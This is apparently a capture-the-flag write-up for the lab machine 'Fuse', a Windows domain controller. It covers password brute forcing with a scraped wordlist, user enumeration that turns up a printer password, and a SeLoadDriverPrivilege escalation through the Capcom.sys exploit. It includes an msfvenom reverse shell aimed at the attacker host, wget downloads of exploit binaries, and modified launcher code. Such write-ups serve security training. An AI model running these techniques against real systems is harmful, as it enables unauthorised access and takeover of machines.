# Fuse

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.2.5
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 09:28 EDT
Nmap scan report for 10.129.2.5
Host is up (0.0074s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5                                                                     
593/tcp   open  http-rpc-epmap                                                               
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49680/tcp open  unknown
49698/tcp open  unknown
```

Loads of ports available.&#x20;

### Fabricorp

When we visit the website hosted, we need to add `fuse.fabricorp.local` to our `/etc/hosts` file. I also added `fabricorp.local` in case. The wesbite was some sort of printing service.

<figure><img src="../../../.gitbook/assets/image (3138).png" alt=""><figcaption></figcaption></figure>

When we view the CSV files of each printing log, we can the user that printed them.

<figure><img src="../../../.gitbook/assets/image (783).png" alt=""><figcaption></figcaption></figure>

We have 5 users in total:

```
bhult
administrator
sthompson
pmerton
tlavel
```

There wasn't much that I could do with this for now.

### SMB + LDAP

Both of these services had nothing of interest. SMB had no null credentials or anything for the users, and LDAP didn't give me any more information.

### Cewl

When stuck, try everything! We have a website and we don't have any credentials, so let's try `cewl`. This tool would scrape the websites and create a wordlist that we might be able to use for brute forcing SMB with `crackmapexec`.&#x20;

```bash
cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > passwords
```

Afterwards, we can run `crackmapexec` to brute force the passwords. Out of all the failures, one stood out.

<figure><img src="../../../.gitbook/assets/image (3628).png" alt=""><figcaption></figcaption></figure>

Seems that we have a valid expired credential here. To change passwords, we can use `smbpasswd`.

{% embed url="https://infinitelogins.com/2020/11/16/changing-active-directory-password-using-smbpasswd/" %}

We just need to change the password of the user as such:

```bash
smbpasswd -r <IP> -U bhult
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user bhult on <IP>
```

Afterwards, we can now enumerate the machine. Take note that the machine resets this password rather frequently, so enumeration needs to be quick.

### SMB + RPC Enum

Using these credentials, we can first check out the SMB shares available via `smbmap`.

```
Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        HP-MFT01                                                NO ACCESS       HP-MFT01
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

Not much here. I used `rpcclient` to further enumerate the users and stuff.&#x20;

```
$> querydispinfo
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x109c RID: 0x1db2 acb: 0x00000210 Account: astein       Name: (null)    Desc: (null)
index: 0x1099 RID: 0x1bbd acb: 0x00020010 Account: bhult        Name: (null)    Desc: (null)
index: 0x1092 RID: 0x451 acb: 0x00020010 Account: bnielson      Name: (null)    Desc: (null)
index: 0x109a RID: 0x1bbe acb: 0x00000211 Account: dandrews     Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x109d RID: 0x1db3 acb: 0x00000210 Account: dmuir        Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x109b RID: 0x1db1 acb: 0x00000210 Account: mberbatov    Name: (null)    Desc: (null)
index: 0x1096 RID: 0x643 acb: 0x00000210 Account: pmerton       Name: (null)    Desc: (null)
index: 0x1094 RID: 0x641 acb: 0x00000210 Account: sthompson     Name: (null)    Desc: (null)
index: 0x1091 RID: 0x450 acb: 0x00000210 Account: svc-print     Name: (null)    Desc: (null)
index: 0x1098 RID: 0x645 acb: 0x00000210 Account: svc-scan      Name: (null)    Desc: (null)
index: 0x1095 RID: 0x642 acb: 0x00020010 Account: tlavel        Name: (null)    Desc: (null)
```

We can add these users to our username file. When enumerate printers, we see this:

{% code overflow="wrap" %}
```
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]
```
{% endcode %}

We now have more credentials! With this, we can try brute forcing the possible passwords with the username list we updated earlier.&#x20;

<figure><img src="../../../.gitbook/assets/image (516).png" alt=""><figcaption></figcaption></figure>

We can test the credentials, and find that we are able to `evil-winrm` into the machine.

<figure><img src="../../../.gitbook/assets/image (2285).png" alt=""><figcaption></figcaption></figure>

Grab the user flag!

## Privilege Escalation

### LoadDriver Fail

When checking our privileges, we come across a new one called `SeLoadDriverPrivilege`.&#x20;

```
*Evil-WinRM* PS C:\Users\svc-print\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

This is vulnerable because it allows us to manipulate the drivers used by the machine, and they are run as SYSTEM. This Github repository contains files that we need to exploit this:

{% embed url="https://github.com/k4sth4/SeLoadDriverPrivilege" %}

I cloned the repo, and then downloaded the relevant files over:

```
*Evil-WinRM* PS C:\Users\svc-print\desktop> wget 10.10.14.2/ExploitCapcom.exe -O ExploitCapcom.exe
*Evil-WinRM* PS C:\Users\svc-print\desktop> wget 10.10.14.2/eoploaddriver_x64.exe -O eoploaddriver_x64.exe
*Evil-WinRM* PS C:\Users\svc-print\desktop> wget 10.10.14.2/Capcom.sys -O Capcom.sys
```

But, following the PoC does not work for some reason. I think it is because the command executed in the pre-compiled binaries don't work on this machine  In this case, we would probably need to change the command that is being run to directly execute a reverse shell.&#x20;

### Second Attempt

First, we can create a reverse shell via `msfvenom`.&#x20;

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f exe -o rev.exe
```

Then, we would need to change the code used and compile the project ourselves. We can grab the project here and open it in VSCode.&#x20;

This is the original code:

```cpp
static bool LaunchShell(TCHAR* cmd)
{
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(NULL, cmd, nullptr, nullptr, FALSE,
        0, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        std::cout << "CMD failed" << std::endl;
        std::cout << GetLastErrorAsString() << std::endl;
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

We can change it to always run the same command regardless, which would be to execute the reverse shell we created in this case. Here's the updated code:

```cpp
static bool LaunchShell(TCHAR* cmd)
{
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(L"C:\\Windows\\system32\\cmd.exe", L"/c \"c:\\users\\svc-print\\documents\\rev.exe\"", nullptr, nullptr, FALSE,
        0, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        std::cout << "CMD failed" << std::endl;
        std::cout << GetLastErrorAsString() << std::endl;
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

We can then build this project into an `.exe` file and download it to Kali. Remember to **select x64 and Release before building**. I also compiled the EoPUploaderDriver file again, just in case.

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver" %}

Then, download all of them again and run it as per the PoC.

```
*Evil-WinRM* PS C:\Users\svc-print\desktop> .\eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv C:\\Temp\\Capcom.sys
*Evil-WinRM* PS C:\Users\svc-print\desktop> .\ExploitCapcom.exe LOAD C:\\Temp\\Capcom.sys
[*] Service Name: bmpccxvu0ôLS
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\????????????????????
NTSTATUS: c0000033, WinError: 0
*Evil-WinRM* PS C:\Users\svc-print\desktop> .\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000080
[*] Shellcode was placed at 000001D1F5F00008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```

Then, we would trigger a reverse shell.&#x20;

<figure><img src="../../../.gitbook/assets/image (1829).png" alt=""><figcaption></figcaption></figure>

Rooted!
